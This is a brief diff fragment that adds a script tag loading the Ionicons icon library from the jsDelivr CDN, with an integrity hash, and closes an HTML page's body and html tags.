+    <script nomodule src="https://cdn.jsdelivr.net/npm/ionicons@7.4.0/dist/ionicons/ionicons.js" integrity="sha256-mr7eJMX3VC3F7G32mk4oWp1C6a2tlMYxUdptfT7uKI8=" crossorigin="anonymous"></script>
+  </body>
+</html>
